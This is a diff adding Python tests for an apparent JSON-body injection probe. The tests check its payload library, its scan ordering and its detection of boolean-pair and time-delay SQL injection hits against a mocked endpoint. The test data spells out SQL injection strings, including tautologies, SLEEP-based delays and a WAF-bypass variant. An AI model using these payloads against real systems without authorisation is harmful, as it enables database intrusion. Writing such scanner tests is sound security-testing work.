@@ -410,6 +410,106 @@ class TestProbeSelfContained:
         }
         assert expected.issubset(classes)
 
+    def test_payload_library_covers_expanded_sql_families(self):
+        from tools.json_inject_probe import PAYLOADS
+
+        values = {str(item["value"]) for item in PAYLOADS if str(item["class"]).startswith("sqli_")}
+        expected = {
+            "' Or 1=1 AND '1'='1",
+            "' Or 1=2 AND '1'='1",
+            "'||1/1||'",
+            "'||1/0||'",
+            "'%df' and sleep(3)#",
+            "+AND 1=1",
+            "+AND sleep(5)",
+            "1');SELECT SLEEP(5)#",
+            "(SELECT 6242 FROM (SELECT(SLEEP(5)))MgdE)",
+        }
+        assert expected.issubset(values)
+        assert {"boolean_pair", "arithmetic", "time_based", "waf_bypass"}.issubset(
+            {str(item.get("family")) for item in PAYLOADS if str(item["class"]).startswith("sqli_")}
+        )
+
+    def test_short_sql_time_probe_uses_its_declared_threshold(self):
+        from tools.json_inject_probe import _detect_hit
+
+        baseline = {"body_text": "{}", "latency": 0.1, "status": 200}
+        response = {"body_text": "{}", "latency": 2.8, "status": 200}
+        assert _detect_hit("sqli_time", baseline, response, "'%df' and sleep(3)#", min_delay=2.5)["hit"]
+
+    def test_payload_plan_puts_each_class_before_deep_variants(self):
+        from tools.json_inject_probe import PAYLOADS, _payload_plan
+
+        class_count = len({str(item["class"]) for item in PAYLOADS})
+        first_classes = {str(item["class"]) for item in _payload_plan()[:class_count]}
+        assert first_classes == {str(item["class"]) for item in PAYLOADS}
+
+    def test_payload_field_plan_reserves_classes_on_wide_json_bodies(self):
+        from tools.json_inject_probe import PAYLOADS, _payload_field_plan
+
+        body = {
+            "login": "x",
+            "query": "x",
+            "host": "x",
+            "url": "x",
+            "path": "x",
+            "value": "x",
+        }
+        class_count = len({str(item["class"]) for item in PAYLOADS})
+        first_classes = {
+            str(payload["class"])
+            for payload, _field in _payload_field_plan(body)[:class_count]
+        }
+
+        assert len(first_classes) == class_count
+
+    def test_boolean_pair_difference_is_promoted_after_both_sides(self, monkeypatch):
+        from tools import json_inject_probe as probe
+
+        def response(body):
+            return {
+                "status": 200,
+                "body_text": body,
+                "body_size": len(body),
+                "headers": "",
+                "latency": 0.05,
+                "error": None,
+            }
+
+        monkeypatch.setattr(probe, "PAYLOADS", [
+            {
+                "class": "sqli_boolean_true",
+                "family": "boolean_pair",
+                "pair_id": "test-pair",
+                "pair_side": "true",
+                "value": "' AND 1=1--",
+                "field_hint": ".*",
+            },
+            {
+                "class": "sqli_boolean_false",
+                "family": "boolean_pair",
+                "pair_id": "test-pair",
+                "pair_side": "false",
+                "value": "' AND 1=2--",
+                "field_hint": ".*",
+            },
+        ])
+        responses = iter([
+            response('{"ok":true,"items":[1,2]}'),
+            response('{"ok":true,"items":[1,2]}'),
+            response('{"ok":false}'),
+        ])
+        monkeypatch.setattr(probe, "_http_post_json", lambda *args, **kwargs: next(responses))
+
+        hits, _ = probe.probe_endpoint(
+            {"url": "https://target.test/search", "body_template": {"q": "x"}},
+            max_requests=6,
+        )
+
+        assert len(hits) == 1
+        assert hits[0]["payload_class"] == "sqli_boolean_pair"
+        assert hits[0]["signal"] == "sqli_boolean_pair_difference"
+
     def test_nosql_payloads_are_dict_typed(self):
         """NoSQL operator/regex payloads must carry a dict value so the
         outgoing JSON body re-shapes the field from string → object."""
